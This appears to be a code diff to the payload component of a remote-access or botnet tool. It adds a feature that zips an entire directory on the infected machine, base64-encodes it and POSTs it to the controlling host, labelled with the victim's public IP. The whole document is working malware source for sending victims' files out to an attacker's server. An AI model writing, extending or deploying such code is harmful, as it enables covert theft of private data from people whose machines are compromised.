@@ -20,6 +20,8 @@ import threading
 import subprocess
 import collections
 import logging.handlers
+import zipfile
+import pathlib
 if sys.version_info[0] < 3:
     from urllib import urlretrieve
     from urllib2 import urlopen, urlparse
@@ -643,6 +645,22 @@ class Payload():
                 datastr = data.decode('utf-8')
                 json_data = {'data': datastr, 'filename': filename, 'type': filetype, 'owner': self.owner, "module": self.upload.__name__, "session": self.info.get('public_ip')}
                 globals()['post']('http://{}:{}'.format(host, port+3), json=json_data)
+                return "Upload complete"
+            elif os.path.isdir(filename):
+                host, port = self.connection.getpeername()
+                folder = pathlib.Path(filename)
+                # zip = zipfile.ZipFile("temp.zip", "w", zipfile.ZIP_DEFLATED)
+                zip_path = './temp.zip'
+                with zipfile.ZipFile(zip_path, 'w') as zip:
+                        for file in folder.iterdir():
+                                zip.write(file)
+                zip.close()
+                with open("temp.zip", 'rb') as fp:
+                    data = base64.b64encode(fp.read())
+                datastr = data.decode('utf-8')
+                json_data = {'data': datastr, 'filename': filename, 'type': ".zip", 'owner': self.owner, "module": self.upload.__name__, "session": self.info.get('public_ip')}
+                globals()['post']('http://{}:{}'.format(host, port+3), json=json_data)
+                os.remove("temp.zip")
                 return "Upload complete"
             else:
                 return "Error: file not found"
